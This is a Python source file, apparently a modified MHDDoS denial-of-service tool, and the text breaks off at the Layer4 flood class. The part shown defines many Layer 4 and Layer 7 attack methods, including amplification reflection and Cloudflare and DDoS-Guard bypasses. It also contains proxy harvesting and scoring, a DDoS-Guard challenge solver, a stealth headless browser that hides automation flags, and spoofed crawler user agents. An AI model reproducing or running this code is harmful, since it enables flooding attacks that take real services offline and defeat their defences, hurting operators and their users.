#!/usr/bin/env python3

import logging
import random
import re
import sqlite3
import ssl
import sys
from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from datetime import datetime
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice, randint
from socket import (
    AF_INET,
    IP_HDRINCL,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    SOCK_DGRAM,
    IPPROTO_ICMP,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    gethostbyname,
    gethostname,
    socket,
)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread, Lock, RLock, current_thread
from time import sleep, time
from typing import Any, List, Set, Tuple, Optional, Union, Dict
from urllib import parse
from urllib.parse import urlparse
from uuid import UUID, uuid4

import psutil
import requests
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, get, cookies
from yarl import URL

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    PLAYWRIGHT_INSTALLED = True
except ImportError:
    PLAYWRIGHT_INSTALLED = False

# --- Tactical Configuration (v1.1.3) ---
__version__: str = "1.1.3"
__dir__: Path = Path(__file__).parent

# Setup High-Signal Logging
basicConfig(
    format="[%(asctime)s - %(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
)
logger = getLogger("MHDDoS")
logger.setLevel(logging.INFO)

# Silence library noise for maximum tactical focus
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
# Disable insecure TLS versions for additional safety (defense-in-depth)
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1

__ip__: Any = None
tor2webs = [
    "onion.city",
    "onion.cab",
    "onion.direct",
    "onion.sh",
    "onion.link",
    "onion.ws",
    "onion.pet",
    "onion.rip",
    "onion.plus",
    "onion.top",
    "onion.si",
    "onion.ly",
    "onion.my",
    "onion.sh",
    "onion.lu",
    "onion.casa",
    "onion.com.de",
    "onion.foundation",
    "onion.rodeo",
    "onion.lat",
    "tor2web.org",
    "tor2web.fi",
    "tor2web.blutmagie.de",
    "tor2web.to",
    "tor2web.io",
    "tor2web.in",
    "tor2web.it",
    "tor2web.xyz",
    "tor2web.su",
    "darknet.to",
    "s1.tor-gateways.de",
    "s2.tor-gateways.de",
    "s3.tor-gateways.de",
    "s4.tor-gateways.de",
    "s5.tor-gateways.de",
]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def exit(*message: str) -> None:
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


# --- Persistent Intelligence Database ---
class IntelligenceDB:
    def __init__(self, db_path: str = "files/intelligence.db"):
        self.db_path = __dir__ / db_path
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self.lock = Lock()
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path, timeout=30.0) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS proxy_intel (
                    ip_port TEXT PRIMARY KEY,
                    latency REAL,
                    score REAL,
                    failures INTEGER,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            conn.commit()

    def update_proxy_scores(self, proxies: List['TacticalProxy']):
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()
                for p in proxies:
                    cursor.execute('''
                        INSERT INTO proxy_intel (ip_port, latency, score, failures, last_seen)
                        VALUES (?, ?, ?, ?, ?)
                        ON CONFLICT(ip_port) DO UPDATE SET
                            latency=excluded.latency,
                            score=excluded.score,
                            failures=failures + excluded.failures,
                            last_seen=excluded.last_seen
                    ''', (str(p.base), p.latency_ms, p.score, p.fail_count, now))
                conn.commit()

    def get_proxy_intel(self, ip_port: str) -> Optional[Dict]:
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT latency, score, failures FROM proxy_intel WHERE ip_port=?', (ip_port,))
                row = cursor.fetchone()
                if row:
                    return {'latency': row[0], 'score': row[1], 'failures': row[2]}
        return None

INTEL_DB = IntelligenceDB()

# --- Dynamic Scaling Globals ---
class EngineState:
    def __init__(self):
        self.active_threads_target = RawValue("i", 0)
        self.max_threads = 0

ENGINE_STATE = EngineState()

class DynamicScaler(Thread):
    def __init__(self, target_host: str, interval: int = 5):
        Thread.__init__(self, daemon=True)
        self.interval = interval
        self.target_host = target_host
        self.consecutive_high_load = 0
        self.consecutive_low_load = 0

    def run(self):
        while True:
            sleep(self.interval)
            cpu = cpu_percent(interval=1)
            mem = virtual_memory().percent
            lat = CURRENT_LATENCY.value
            current_target = ENGINE_STATE.active_threads_target.value

            # Downscale if host is struggling (CPU > 85% or RAM > 85% or Latency Timeout)
            if cpu > 85 or mem > 85 or lat == -1.0:
                self.consecutive_high_load += 1
                self.consecutive_low_load = 0
                if self.consecutive_high_load >= 2:
                    new_target = max(10, int(current_target * 0.8)) # Drop by 20%
                    if new_target < current_target:
                        logger.warning(f"{bcolors.WARNING}[!] Dynamic Scaler: High load detected (CPU: {cpu}%, RAM: {mem}%). Downscaling workers to {new_target}.{bcolors.RESET}")
                        ENGINE_STATE.active_threads_target.value = new_target
                    self.consecutive_high_load = 0
            
            # Upscale if host is bored and target is responding well (CPU < 50%, RAM < 60%, Latency < 1000ms)
            elif cpu < 50 and mem < 60 and 0 < lat < 1000:
                self.consecutive_low_load += 1
                self.consecutive_high_load = 0
                if self.consecutive_low_load >= 3:
                    new_target = min(ENGINE_STATE.max_threads, int(current_target * 1.1) + 10) # Increase by 10%
                    if new_target > current_target:
                        logger.info(f"{bcolors.OKCYAN}[*] Dynamic Scaler: System optimal. Upscaling workers to {new_target}.{bcolors.RESET}")
                        ENGINE_STATE.active_threads_target.value = new_target
                    self.consecutive_low_load = 0
            else:
                self.consecutive_high_load = 0
                self.consecutive_low_load = 0


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB",
        "BYPASS",
        "GET",
        "POST",
        "OVH",
        "STRESS",
        "DYN",
        "SLOW",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "DGB",
        "AVB",
        "CFBUAM",
        "APACHE",
        "XMLRPC",
        "BOT",
        "BOMB",
        "DOWNLOADER",
        "KILLER",
        "TOR",
        "RHEX",
        "STOMP",
    }

    LAYER4_AMP: Set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

    LAYER4_METHODS: Set[str] = {
        *LAYER4_AMP,
        "TCP",
        "UDP",
        "SYN",
        "VSE",
        "MINECRAFT",
        "MCBOT",
        "CONNECTION",
        "CPS",
        "FIVEM",
        "FIVEM-TOKEN",
        "TS3",
        "MCPE",
        "ICMP",
        "OVH-UDP",
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
]


class Counter:
    def __init__(self, value: int = 0) -> None:
        self._value = RawValue("i", value)

    def __iadd__(self, value: int) -> "Counter":
        self._value.value += value
        return self

    def __int__(self) -> int:
        return self._value.value

    def set(self, value: int) -> "Counter":
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
CURRENT_LATENCY = RawValue("d", 0.0)
DYNAMIC_RPC = RawValue("i", 100)


class HealthMonitor(Thread):
    def __init__(
        self, target_host: str, port: int, method_type: str, interval: int = 2
    ):
        Thread.__init__(self, daemon=True)
        self.target_host = target_host
        self.port = port
        self.method_type = method_type
        self.interval = interval

    def run(self):
        while True:
            try:
                start_t = time()
                if self.method_type == "L7":
                    with get(f"http://{self.target_host}:{self.port}", timeout=2) as r:
                        pass
                else:
                    with socket(AF_INET, SOCK_STREAM) as s:
                        s.settimeout(2)
                        s.connect((self.target_host, self.port))
                CURRENT_LATENCY.value = (time() - start_t) * 1000
            except Exception:
                CURRENT_LATENCY.value = -1.0  # -1 means offline or timeout
            sleep(self.interval)


class TacticalProxy:
    def __init__(self, base_proxy: Proxy, latency_ms: float, is_protocol_verified: bool = False):
        self.base = base_proxy
        self.latency_ms = latency_ms
        self.is_protocol_verified = is_protocol_verified
        self.fail_count = 0
        self.success_count = 0
        self.score = self._calculate_initial_score()

    def _calculate_initial_score(self):
        # Base score on latency: < 100ms = 90-100, 500ms = 50, 1000ms = 0
        return max(1, 100 - (self.latency_ms / 10))

    def update_score(self, current_failures: int):
        # Penalty for failures: -10 points per failure recorded in this cycle
        self.score = max(1, self._calculate_initial_score() - (current_failures * 15))

    def __str__(self):
        return self.base.__str__()

    def open_socket(self, family=AF_INET, type=SOCK_STREAM, timeout=2):
        return self.base.open_socket(family, type, timeout)


class TacticalProxyValidator:
    @staticmethod
    def validate_and_score(raw_proxies: Set[Proxy], target_url: str = None, is_layer7: bool = True, is_udp: bool = False) -> List[TacticalProxy]:
        tactical_proxies = []
        total_raw = len(raw_proxies)
        
        if total_raw == 0:
            return []

        logger.info(
            f"{bcolors.OKBLUE}[*] Resource: Tactical scoring initiated for {total_raw:,} assets...{bcolors.RESET}"
        )

        target_host = "8.8.8.8"
        target_port = 53 if is_udp else 443
        requires_ssl = False

        if target_url and is_layer7:
            from urllib.parse import urlparse
            parsed = urlparse(target_url)
            target_host = parsed.netloc or parsed.path
            requires_ssl = parsed.scheme == "https"
            target_port = 443 if requires_ssl else 80
        elif target_url and not is_layer7:
            if ":" in target_url:
                target_host, target_port = target_url.split(":")
                target_port = int(target_port)
            else:
                target_host = target_url

        def _check(proxy: Proxy) -> TacticalProxy:
            p_str = str(proxy)
            intel = INTEL_DB.get_proxy_intel(p_str)
            
            # If we have recent, high-quality intel, skip active verification to speed up deployment
            if intel and intel['failures'] < 3 and intel['latency'] < 1500:
                p = TacticalProxy(proxy, intel['latency'], True)
                p.score = intel['score']
                p.fail_count = intel['failures']
                return p
                
            start_time = time()
            try:
                # 1. Connection Check
                s = proxy.open_socket(timeout=3)
                if not s: 
                    return TacticalProxy(proxy, 2500.0, False)
                
                is_verified = False
                # 2. SSL Handshake for L7 HTTPS
                if requires_ssl and is_layer7:
                    try:
                        s.settimeout(3)
                        s = ctx.wrap_socket(s, server_hostname=target_host, do_handshake_on_connect=True)
                        is_verified = True
                    except:
                        with suppress(Exception): s.close()
                        return TacticalProxy(proxy, 2000.0, False)
                
                # 3. UDP Associate Check for SOCKS5/UDP
                elif is_udp and proxy.type == ProxyType.SOCKS5:
                    try:
                        s.settimeout(3)
                        s.sendall(b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
                        res = s.recv(10)
                        if res and res[1] == 0x00:
                            is_verified = True
                        else:
                            with suppress(Exception): s.close()
                            return TacticalProxy(proxy, 2200.0, False)
                    except:
                        with suppress(Exception): s.close()
                        return TacticalProxy(proxy, 2200.0, False)
                else:
                    is_verified = True

                latency = (time() - start_time) * 1000
                with suppress(Exception): s.close()
                return TacticalProxy(proxy, latency, is_verified)
            except:
                return TacticalProxy(proxy, 3000.0, False)

        max_workers = min(800, total_raw)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(_check, p) for p in raw_proxies]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result: tactical_proxies.append(result)
                except: continue

        elite_count = len([p for p in tactical_proxies if p.latency_ms < 1000])
        logger.info(
            f"{bcolors.OKGREEN}[*] Resource: Scoring complete. Elite-Tier: {elite_count:,} | Total Assets: {len(tactical_proxies):,} (Retained).{bcolors.RESET}"
        )
        
        tactical_proxies.sort(key=lambda p: p.score, reverse=True)
        INTEL_DB.update_proxy_scores(tactical_proxies)
        return tactical_proxies


class TacticalProxyPool:
    def __init__(self, proxies: List[TacticalProxy] = None):
        self._proxies = proxies if proxies else []
        self._failures = {} # Map proxy string to failure count
        self._lock = RLock()
        self._weights = []
        self._last_weight_update = 0
        self._update_weights()

    def report_failure(self, proxy_obj: Proxy):
        p_str = str(proxy_obj)
        with self._lock:
            self._failures[p_str] = self._failures.get(p_str, 0) + 1

    def _update_weights(self):
        with self._lock:
            if not self._proxies:
                self._weights = []
                self._pool_copy = []
                return
            for p in self._proxies:
                p_str = str(p.base)
                p.update_score(self._failures.get(p_str, 0))
            self._weights = [p.score for p in self._proxies]
            self._pool_copy = list(self._proxies) # Create a read-only copy for lock-free access
            self._failures = {} 
            self._last_weight_update = time()
            # Periodically sync to DB
            Thread(target=INTEL_DB.update_proxy_scores, args=(self._pool_copy,), daemon=True).start()

    def update_pool(self, new_proxies: List[TacticalProxy]):
        with self._lock:
            self._proxies = new_proxies
            self._failures = {}
            self._update_weights()
            if self._proxies:
                avg_lat = sum(p.latency_ms for p in self._proxies[:50]) / min(50, len(self._proxies))
                logger.info(
                    f"{bcolors.OKGREEN}[*] Tactical Pool: {len(new_proxies):,} nodes active. Elite-Tier Latency: {avg_lat:.1f}ms{bcolors.RESET}"
                )

    def get_proxy(self) -> Optional[Proxy]:
        # Lock-free read path for maximum performance under heavy thread load
        if time() - self._last_weight_update > 60:
            self._update_weights()
            
        pool = getattr(self, '_pool_copy', [])
        weights = getattr(self, '_weights', [])
        
        if not pool: return None
        try:
            return random.choices(pool, weights=weights, k=1)[0].base
        except:
            return pool[0].base

    def __len__(self):
        with self._lock: return len(self._proxies)

    def get_tactical_size(self):
        return len(self)


class AutonomousHarvester:
    FALLBACK_APIS = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt"
    ]

    @staticmethod
    def fromString(line: str) -> Optional[Proxy]:
        line = line.strip()
        if not line: return None
        
        # Robust parsing for Type://IP:PORT and IP:PORT formats
        try:
            if "://" in line:
                return Proxy.fromString(line)
            
            # Default to SOCKS5 for raw IP:PORT if format unknown
            import re
            match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)", line)
            if match:
                ip, port = match.group(1), int(match.group(2))
                return Proxy(ip, port, ProxyType.SOCKS5)
        except: pass
        return None

    @staticmethod
    def emergency_harvest(proxy_ty: int) -> Set[Proxy]:
        logger.warning(f"{bcolors.FAIL}[!] EMERGENCY PROTOCOL: Autonomous Sourcing Activated. Initiating deep global scrape...{bcolors.RESET}")
        proxies = set()
        
        def _fetch(url):
            try:
                res = get(url, timeout=10)
                if res.status_code == 200:
                    for line in res.text.splitlines():
                        p = AutonomousHarvester.fromString(line)
                        if p: proxies.add(p)
            except: pass

        with ThreadPoolExecutor(max_workers=len(AutonomousHarvester.FALLBACK_APIS)) as executor:
            executor.map(_fetch, AutonomousHarvester.FALLBACK_APIS)
            
        logger.info(f"{bcolors.WARNING}[*] EMERGENCY PROTOCOL: Successfully recovered {len(proxies):,} raw assets from global fallback matrices.{bcolors.RESET}")
        return proxies


class ReloadSentinel(Thread):
    def __init__(
        self, interval_mins: int, con, proxy_arg, proxy_ty, pool: TacticalProxyPool, url=None
    ):
        Thread.__init__(self, daemon=True)
        self.interval = interval_mins * 60
        self.con = con
        self.proxy_arg = proxy_arg
        self.proxy_ty = proxy_ty
        self.pool = pool
        self.url = url

    def run(self):
        if self.interval <= 0:
            return

        while True:
            sleep(self.interval)
            
            # Check if pool is critically low
            if self.pool.get_tactical_size() < 10:
                logger.warning(f"{bcolors.FAIL}[!] Sentinel Alert: Tactical Pool Depleted ({self.pool.get_tactical_size()} active). Executing Emergency Sourcing.{bcolors.RESET}")
                raw_emergency = AutonomousHarvester.emergency_harvest(self.proxy_ty)
                if raw_emergency:
                    scored_emergency = TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None)
                    self.pool.update_pool(scored_emergency)
                    continue

            logger.info(
                f"{bcolors.OKCYAN}[*] Sentinel: Periodic proxy refresh initiated...{bcolors.RESET}"
            )
            try:
                new_proxies = handleProxyList(
                    self.con, self.proxy_arg, self.proxy_ty, self.url
                )
                if new_proxies:
                    # In handleProxyList we return normal Proxies if from file/url directly.
                    # We need to ensure they are scored here if they aren't already.
                    if isinstance(new_proxies, list) and len(new_proxies) > 0 and isinstance(new_proxies[0], TacticalProxy):
                        self.pool.update_pool(new_proxies)
                    else:
                        scored = TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None)
                        self.pool.update_pool(scored)
            except Exception as e:
                logger.error(
                    f"{bcolors.FAIL}[!] Sentinel Error during refresh: {e}{bcolors.RESET}"
                )


class Tools:
    IP = re.compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = re.compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B",
            "k{}B",
            "M{}B",
            "G{}B",
            "T{}B",
            "P{}B",
            "E{}B",
            "Z{}B",
            "Y{}B",
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> Union[str, int]:
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obje = sum([abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0**obje:.{precision}f}{suffixes[obje]}"
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len(
            "\r\n".join(f"{key}: {value}" for key, value in res.request.headers.items())
        )
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1",
            }
            with s.get(url, headers=hdrs, timeout=10) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.post(
                "https://check.ddos-guard.net/check.js", headers=hdrs, timeout=10
            ) as ss:
                for key, value in ss.cookies.items():
                    if key == "__ddg2":
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.get(
                f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs, timeout=10
            ) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s
        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class BrowserEngine:
    """Advanced Browser Fingerprinting Engine for bypassing JS/Captcha challenges"""
    
    @staticmethod
    def solve_cf(url: str, proxy: str = None, timeout: int = 15000):
        if not PLAYWRIGHT_INSTALLED:
            logger.error("[!] Playwright is not installed. CFBUAM requires playwright. Run: pip install playwright && playwright install chromium")
            return None, None
            
        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Initializing headless browser for {url}...{bcolors.RESET}")
        
        try:
            with sync_playwright() as p:
                launch_args = {
                    "headless": True,
                    "args": [
                        "--disable-blink-features=AutomationControlled",
                        "--disable-infobars",
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--ignore-certificate-errors",
                        "--disable-extensions"
                    ]
                }
                
                if proxy:
                    proxy_url = f"http://{proxy}" if not "://" in proxy else proxy
                    launch_args["proxy"] = {"server": proxy_url}
                    
                browser = p.chromium.launch(**launch_args)
                
                # Create a stealthy context
                context = browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    locale='en-US',
                    timezone_id='America/New_York'
                )
                
                # Mock webdriver to False to bypass detection
                context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                """)
                
                page = context.new_page()
                page.set_default_timeout(timeout)
                
                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
                
                # Wait until network is mostly idle (indicates challenge passed and page loaded)
                response = page.goto(url, wait_until="networkidle")
                
                # If still stuck on challenge, wait a bit longer for JS to execute
                if "Just a moment" in page.title() or "Attention Required" in page.title():
                    logger.info(f"{bcolors.WARNING}[*] Headless Recon: Waiting for JS challenge verification...{bcolors.RESET}")
                    try:
                        page.wait_for_selector("text=Just a moment", state="hidden", timeout=10000)
                    except PlaywrightTimeoutError:
                        pass
                
                title = page.title()
                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation complete. Page Title: {title}{bcolors.RESET}")
                
                # Extract solved cookies and user-agent
                cookies_list = context.cookies()
                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                ua = page.evaluate("navigator.userAgent")
                
                browser.close()
                return cookie_str, ua
                
        except Exception as e:
            logger.error(f"{bcolors.FAIL}[!] Headless Recon Failed: {e}{bcolors.RESET}")
            return None, None


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b""
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b"".join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack(">H", integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack(">q", integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def handshake_forwarded(
        target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID
    ) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(
                target[0].encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()
            ),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(
            Minecraft.varint(
                0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00
            ),
            Minecraft.data(username),
        )

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x0F
                if protocol >= 755
                else (
                    0x10
                    if protocol >= 712
                    else (
                        0x0F
                        if protocol >= 471
                        else (
                            0x10
                            if protocol >= 464
                            else (
                                0x0E
                                if protocol >= 389
                                else (
                                    0x0C
                                    if protocol >= 386
                                    else (
                                        0x0B
                                        if protocol >= 345
                                        else (
                                            0x0A
                                            if protocol >= 343
                                            else (
                                                0x0B
                                                if protocol >= 336
                                                else (
                                                    0x0C
                                                    if protocol >= 318
                                                    else (
                                                        0x0B
                                                        if protocol >= 107
                                                        else 0x00
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            ),
            Minecraft.long(num_id) if protocol >= 339 else Minecraft.varint(num_id),
        )

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x03
                if protocol >= 755
                else (
                    0x03
                    if protocol >= 464
                    else (
                        0x02
                        if protocol >= 389
                        else (
                            0x01
                            if protocol >= 343
                            else (
                                0x02
                                if protocol >= 336
                                else (
                                    0x03
                                    if protocol >= 318
                                    else 0x02 if protocol >= 107 else 0x01
                                )
                            )
                        )
                    )
                )
            ),
            Minecraft.data(message.encode()),
        )


class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxy_pool: TacticalProxyPool = None

    def __init__(
        self,
        target: Tuple[str, int],
        ref: List[str] = None,
        method: str = "TCP",
        synevent: Event = None,
        proxy_pool: TacticalProxyPool = None,
        protocolid: int = 74,
    ):
        Thread.__init__(self, daemon=True)
